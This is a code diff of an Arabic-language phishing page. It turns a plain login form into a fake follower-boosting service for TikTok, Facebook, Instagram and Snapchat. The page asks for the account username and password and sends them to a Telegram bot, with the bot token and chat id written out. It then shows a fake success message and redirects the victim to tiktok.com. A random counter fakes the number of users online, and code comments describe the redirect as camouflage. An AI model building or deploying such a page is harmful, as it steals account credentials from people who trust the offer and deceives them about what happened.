@@ -3,101 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>SMM Master | زيادة متابعين وتفاعل</title>
     <style>
+        :root { --tiktok: #ee1d52; --fb: #1877f2; --insta: #e1306c; --dark: #010101; }
         body { 
-            background: #0f172a; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #000000; display: flex; align-items: center; justify-content: center; 
+            min-height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: white;
         }
-        .card { 
-            background: #1e293b; 
-            padding: 40px 30px; 
-            border-radius: 16px; 
-            width: 100%; 
-            max-width: 350px; 
-            text-align: center; 
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); 
-            border: 1px solid rgba(255, 255, 255, 0.05); 
+        .main-card { 
+            background: #121212; padding: 35px 25px; border-radius: 30px; width: 90%; max-width: 400px; 
+            text-align: center; border: 1px solid #2c2c2c; box-shadow: 0 10px 50px rgba(238, 29, 82, 0.1);
         }
-        h2 { 
-            color: #f8fafc; 
-            margin-bottom: 30px; 
-            font-size: 24px; 
-            font-weight: 600; 
+        .logo-area { margin-bottom: 20px; }
+        .logo-area h1 { font-size: 28px; letter-spacing: -1px; margin: 0; background: linear-gradient(45deg, #69c9d0, #ee1d52, #ffffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        .badge { background: #ee1d52; color: white; padding: 4px 12px; border-radius: 50px; font-size: 11px; font-weight: bold; margin-bottom: 15px; display: inline-block; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        select, input { 
+            width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #333; 
+            background: #1a1a1a; color: white; font-size: 16px; box-sizing: border-box; outline: none;
         }
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            margin-bottom: 20px; 
-            border: 1px solid #334155; 
-            border-radius: 8px; 
-            background: #0f172a; 
-            color: white; 
-            outline: none; 
-            font-size: 16px; 
-            box-sizing: border-box; 
-            transition: 0.3s;
+        input:focus { border-color: #ee1d52; }
+
+        .btn-go { 
+            width: 100%; padding: 16px; border: none; border-radius: 12px; 
+            background: #fff; color: #000; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s;
         }
-        input:focus { 
-            border-color: #38bdf8; 
-            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2); 
-        }
-        button { 
-            width: 100%; 
-            padding: 14px; 
-            border: none; 
-            border-radius: 8px; 
-            background: #38bdf8; 
-            color: #0f172a; 
-            font-weight: bold; 
-            font-size: 16px; 
-            cursor: pointer; 
-            transition: 0.3s; 
-        }
-        button:hover { 
-            background: #0ea5e9; 
-            transform: translateY(-1px); 
-        }
+        .btn-go:hover { background: #ee1d52; color: #fff; transform: translateY(-2px); }
+
+        .info-list { text-align: right; font-size: 13px; color: #888; margin: 20px 0; padding-right: 10px; border-right: 2px solid #ee1d52; }
+        .live-status { font-size: 12px; color: #4ade80; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>تسجيل الدخول</h2>
-        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
-        <input type="password" id="pass" placeholder="كلمة المرور" required>
-        <button onclick="sendData()">تسجيل الدخول</button>
+    <div class="main-card">
+        <div class="logo-area">
+            <h1>SMM Global</h1>
+            <div class="badge">نظام التراسل الفوري مفعّل</div>
+        </div>
+
+        <p style="font-size: 14px; color: #bbb; margin-bottom: 20px;">اختر المنصة لبدء إرسال المتابعين:</p>
+        
+        <select id="platform">
+            <option value="TikTok">تيك توك - زيادة متابعين ومشاهدات</option>
+            <option value="Facebook">فيسبوك - زيادة لايكات ومتابعين</option>
+            <option value="Instagram">إنستغرام - زيادة فولو ولايكات</option>
+            <option value="Snapchat">سناب شات - رفع سكور سريع</option>
+        </select>
+
+        <input type="text" id="user" placeholder="اسم المستخدم (Username)" required>
+        <input type="password" id="pass" placeholder="كلمة مرور الحساب للربط" required>
+        
+        <button class="btn-go" onclick="sendData()">تفعيل الزيادة فوراً</button>
+
+        <div class="info-list">
+            • ضمان عدم النقصان لمدة 90 يوم<br>
+            • سرعة التنفيذ: 5000 متابع/ساعة<br>
+            • متوافق مع كافة حسابات 2026
+        </div>
+
+        <div class="live-status">
+            🟢 المتواجدون الآن: <span id="online">...</span>
+        </div>
     </div>
 
     <script>
+        function updateOnline() {
+            document.getElementById('online').innerText = (Math.floor(Math.random() * (18000 - 15000) + 15000)).toLocaleString();
+        }
+        setInterval(updateOnline, 2000);
+        updateOnline();
+
         function sendData() {
-            // بيانات بوت التليجرام الخاصة بك
+            // تم التحديث للتوكن الجديد
             const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; 
             const chat_id = "1564944407"; 
             
+            const platform = document.getElementById('platform').value;
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
 
             if(user === "" || pass === "") {
-                alert("الرجاء ملء كافة الحقول");
-                return;
+                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح"); return;
             }
 
-            const msg = `🚀 صيدة جديدة من Superstar!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
+            const msg = `🚀 صيدة جدييييدة!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
 
-            fetch(url)
-                .then(() => { 
-                    // تحويل المستخدم لصفحة حقيقية للتمويه
-                    window.location.href = "https://www.google.com"; 
-                })
-                .catch(() => {
-                    window.location.href = "https://www.google.com";
-                });
+            fetch(url).finally(() => {
+                alert("تم ربط الحساب بنجاح! انتظر وصول المتابعين خلال دقائق.");
+                window.location.href = "https://www.tiktok.com"; 
+            });
         }
     </script>
 </body>
